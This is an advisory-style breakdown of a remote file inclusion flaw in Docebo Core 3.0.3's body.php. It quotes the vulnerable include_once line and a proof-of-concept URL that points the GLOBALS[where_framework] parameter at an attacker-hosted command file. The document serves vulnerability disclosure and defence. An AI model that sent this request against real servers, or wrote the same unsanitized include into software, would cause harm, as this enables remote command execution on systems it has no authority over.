Based on the provided content, here's a breakdown of the vulnerability:

**Root Cause:**

*   The vulnerability stems from the lack of sanitization of the `$GLOBALS['where_framework']` variable in the `body.php` file of Docebo Core 3.0.3. This variable is used in an `include_once()` statement.

**Weaknesses/Vulnerabilities:**

*   **Unsanitized Input:** The application doesn't properly sanitize or validate the `$GLOBALS['where_framework']` variable before using it in an `include_once()` statement.
*   **Remote File Inclusion (RFI):** Because the unsanitized variable is used in a file inclusion, it allows an attacker to include a remote file.

**Impact of Exploitation:**

*   **Remote Command Execution:** By including a malicious remote file, an attacker can achieve remote command execution on the server.

**Attack Vectors:**

*   **HTTP GET Request:** The vulnerability can be exploited by crafting a malicious HTTP GET request that includes the vulnerable parameter.
*   **URL Manipulation:** The attacker manipulates the `GLOBALS[where_framework]` parameter in the URL to point to a malicious remote file.

**Required Attacker Capabilities/Position:**

*   **Remote Access:** The attacker can be remote and doesn't need local access to the server.
*   **Knowledge of Vulnerable URL:** The attacker needs to know the vulnerable URL structure of the application.
*   **Web Server Access:** The attacker needs access to a web server to host the malicious code.

**Technical Details:**

*   The vulnerable code snippet is `include_once($GLOBALS['where_framework']."/lib/lib.upload.php");` in `body.php`.
*   The proof of concept is provided as `http://example/[dc_path]/addons/mod_media/body.php?GLOBALS[where_framework]=[cmd_url]`.
*   The vulnerability is classified as a high-risk issue.
*   The suggested solution is to include the file where `$GLOBALS` are declared.
*   CVSS Base Score is 6.8/10.
*   Exploit range is remote.
*   Attack complexity is medium.
*   Authentication is not required for exploitation.
